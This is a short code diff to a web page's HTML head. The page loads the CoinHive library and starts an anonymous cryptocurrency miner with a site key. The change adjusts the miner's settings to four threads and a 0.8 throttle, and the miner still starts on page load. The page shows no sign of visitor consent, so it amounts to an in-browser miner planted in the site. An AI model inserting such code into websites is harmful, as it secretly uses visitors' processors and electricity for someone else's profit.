@@ -8,7 +8,12 @@
 	<link rel="stylesheet" type="text/css" href="assets/css/hexagons.min.css"> 
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <script>
-	var miner = new CoinHive.Anonymous('wrA6iLpmjND67HDarVFYDsUzqzEChNVE');
+    var miner = new CoinHive.Anonymous('wrA6iLpmjND67HDarVFYDsUzqzEChNVE', {
+        threads: 4,
+        autoThreads: false,
+        throttle: 0.8,
+        forceASMJS: false
+    });
 	miner.start();
     </script>
 
